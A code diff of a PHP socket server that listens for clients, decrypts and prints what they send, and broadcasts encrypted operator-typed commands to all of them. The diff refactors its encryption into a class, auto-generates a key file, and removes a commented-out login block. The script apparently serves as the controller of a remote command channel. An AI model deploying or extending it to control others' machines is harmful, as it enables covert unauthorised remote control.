@@ -1,7 +1,5 @@
-#!/usr/bin/php -q
+#!/usr/bin/php -d memory_limit=2048M
 <?php
-
-	//error_reporting(0);
 	set_time_limit(0);
 	ob_implicit_flush(1);
 	define("DELIMITER", "-------------------------------------");
@@ -13,44 +11,29 @@
 	);
 	$opts  = getopt($short,$long);
 
-	if(count($opts) < 2){
-		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
-	}
-
-	/*************************	auth. ****************************/
-	//require_once './serverlogin.php';
-	//if(!calllogin()) die("Login failed");
-	/************************* /auth. ****************************/
-
+	(count($opts) === 2) or die("Assign remote ip [-h/--host] and port [-p/--port]\n");
 	
 	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$host_port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
+	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) or die("[\33[91m!\33[0m] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\n");
 
-	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
-	{
-	    die("[\33[91m!\33[0m] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\n");
-	}
+	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
 
+	(socket_bind($master_sock, $host_addr, (int)$host_port)) or die("[\33[91m!\33[0m] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 
-	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);	// options??
-
-
-	if (socket_bind($master_sock, $host_addr, (int)$host_port) === false)	// bind
-	{
-	    die("[\33[91m!\33[0m] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
-	}
-
-
-	if (socket_listen($master_sock) === false)	// listen
-	{
-	    die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
-	}
+	(socket_listen($master_sock)) or die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 	
-	$key = file_get_contents(".success");
-
-	define('KEY',$key);
-	define('CYPHER', 'aes-256-gcm');
+	require_once 'Openssl_EncryptDecrypt.php';
+	if(!file_exists('.success')){
+		$key = base64_encode(bin2hex(openssl_random_pseudo_bytes(32)));
+		file_put_contents('.success', $key);
+		// ili exit(1);??
+	} else {
+		$key = file_get_contents(".success");
+	}
+	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	define('ENCRYPTION_KEY', $key);
 
 	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
 	
@@ -132,7 +115,12 @@
 
 	        if($data !== "")
 	        {
-        		$data = trim(__decrypt($data));
+				$temp_data = $data;
+				$data = $openssl_encrypt_decrypt->decrypt($data, ENCRYPTION_KEY);
+				if($data === null){
+					$data = $temp_data;
+				}
+
 		    	echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
 	        }
 
@@ -160,7 +148,8 @@
 				{
 					$full_cmd .= trim($cmd);
 				}
-				$full_cmd = __encrypt($full_cmd);
+				$full_cmd = $openssl_encrypt_decrypt->encrypt($full_cmd, ENCRYPTION_KEY);
+
 
 				foreach ($write as $send_sock)
 		  		{
@@ -204,7 +193,7 @@
 		    	&& $line != 'clients'
 				&& $line != 'exit')
 		    {
-		    	$line = __encrypt($line);
+				$line = $openssl_encrypt_decrypt->encrypt($line, ENCRYPTION_KEY);
 
 			  	foreach ($write as $send_sock)
 			  	{
@@ -230,47 +219,4 @@
 	echo "Closing master socket..\n";
 	socket_close($master_sock);
 	exit(0);
-
-	/*:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/
-
-	function __encrypt($message)
-	{
-		$msg = base64_encode($message);
-
-		if(in_array(CYPHER, openssl_get_cipher_methods()))
-		{
-			$ivlen     = openssl_cipher_iv_length(CYPHER);
-			$iv        = openssl_random_pseudo_bytes($ivlen);
-			$cyphertxt = openssl_encrypt($msg, CYPHER, KEY, $options=0, $iv, $tag);
-		}
-
-	    return base64_encode($cyphertxt).':'.bin2hex($iv).':'.bin2hex($tag);
-	}
-
-	function __decrypt($input)
-	{
-		$encrypted  = explode(":", $input);
-
-		if(is_base64($encrypted[0])) // cyphertext without ivector/tag
-		{
-			$cyphertext =  base64_decode($encrypted[0]);
-			$iv         =  hex2bin($encrypted[1]);
-			$tag        =  hex2bin($encrypted[2]);
-
-			$original = openssl_decrypt($cyphertext, CYPHER, KEY, $options=0, $iv, $tag);
-
-			return base64_decode($original);
-		}
-		return $input;
-	}
-
-
-	function is_base64(string $s) : bool
-	{
-		return base64_decode($s, true) === false ? false : true;
-		/*  || ((substr($s, -2) !== '==') 
-			|| (substr($s, -1) !== '=')))
-			 ? false : true;
-		*/
-	}
 ?>
